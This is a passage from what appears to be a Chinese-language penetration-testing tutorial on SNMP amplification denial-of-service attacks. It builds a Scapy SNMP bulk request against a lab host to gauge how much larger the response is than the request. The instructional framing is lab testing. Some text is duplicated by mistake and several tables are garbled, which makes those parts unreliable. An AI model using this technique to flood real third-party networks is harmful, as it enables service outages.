  \n319\n\n### 拒绝服务 (Denial of Service)\n\n### 工作原理……\n放大攻击通过利用第三方设备产生网络流量来淹没目标。对于大多数放大攻击，满足以下两个条件：\n\
  \n- 用于执行攻击的协议不验证请求源。\n- 网络返回的响应应比请求大得多。\n\nDNS 放大攻击的效能与 DNS 查询响应的大小直接相关。通过向多个 DNS\
  \ 服务器发送请求，可以增加攻击威力。\n\n##### SNMP 放大攻击\nSNMP 放大攻击通过伪造具有可预测社区字符串（community strings）的查询来利用\
  \ SNMP 设备。通过向多个设备同时发送请求可以增加流量。\n\n### 准备工作\n要模拟 SNMP 放大攻击，你需要一个启用了 SNMP 的设备。在示例中，使用了\
  \ Windows 设备来实现此目的。关于设置 Ubuntu 的更多信息，请参考书中的第 1 章 *安装 Ubuntu Server*。\n\n### 如何操作……\n\
  要开始操作，我们首先应该构造返回到系统的 SNMP 查询来评估负载大小。首先需要构造的层是 IP 层：\n\n```python\n>>> i = IP()\n\
  >>> i.display()\n```\n```\n###[ IP ]###\nversion= 4\nihl= None\ntos= 0x0\nlen= None\n\
  id= 1\nflags= \nttl= 64\nproto= ip\nchksum= None\n```\n\n为了构建请求的 IP 层，我们需要将 IP 对象赋值给变量\
  \ `i`。通过调用 `display()` 函数，我们可以识别对象的属性配置。默认情况下，发送和接收地址都设置为回环地址 `127.0.0.1`。\n\n这些值可以通过更改目标地址为\
  \ `172.16.36.134` 来修改。\n\n现在 IP 层已经构建，我们需要构建 UDP 层：\n\n```python\n>>> u = UDP()\n\
  >>> u.display()\n```\n```\n###[ UDP ]###\nsport= domain\ndport= domain\nlen= None\n\
  chksum= None\n```\n\n为了构建请求的 IP 层，我们需要将 IP 对象赋值给变量 `i`。通过调用 `display()` 函数，我们可以识别对象的属性配置。默认情况下，发送和接收地址都设置为回环地址\
  \ `127.0.0.1`。\n\n现在 IP 层已经构建完成，我们需要构建 SNMP 层：\n\n```python\n>>> snmp = SNMP()\n\
  >>> snmp.display()\n```\n```\n###[ SNMP ]###\nversion= 2c\ncommunity= 'public'\n\
  \\PDU\\\n###[ SNMPget ]###\nid= 0\nerror= no_error\nerror_index= 0\n\\varbindlist\\\
  \n```\n\n使用 bulk 请求来替换默认分配给 PDU 的 SNMPget 请求：\n\n```python\n>>> bulk = SNMPbulk()\n\
  >>> bulk.display()\n```\n```\n###[ SNMPbulk ]###\nid= 0\nnon_repeaters= 0\nmax_repetitions=\
  \ 0\n\\varbindlist\\\n```\n\n```python\n>>> bulk.max_repetitions = 50\n>>> bulk.varbindlist=[SNMPvarbind(oid=ASN1_OID['.1.3.6.1.2.1.1']),SNMPvarbind(oid=ASN1_OID['.1.3.6.1.2.1.19.1.3'])]\n\
  >>> bulk.display()\n```\n\n\n\n\n\n| `value=` `<ASN1_NULL[0]>` |\n\n### [ SNMPvarbind\
  \ ]\n\n| `oid=` `<ASN1_OID['.1.3.6.1.2.1.19.1.3']>` |\n| `value=` `<ASN1_NULL[0]>`\
  \ |\n\n323\n\n拒绝服务\n\n需要修改 `SNMP varbindlist` 以包含所查询的 OID 值。\n\n此外，`max_repetitions`\
  \ 被分配了整数值 `50`。现在批量请求（bulk request）已经配置完成，应该将批量请求对象赋值为 SNMP PDU 值：\n\n```\n>>> snmp.PDU\
  \ = bulk\n>>> snmp.display()\n```\n\n### [ SNMP ]\n\n`version= v2c`\n`community=\
  \ 'public'`\n\n`PDU`\n\n### [ SNMPbulk ]\n\n| `id=` `0` |\n| `non_repeaters=` `0`\
  \ |\n| `max_repetitions=` `50` |\n| `varbindlist` |\n| | [ SNMPvarbind ] |\n| |\
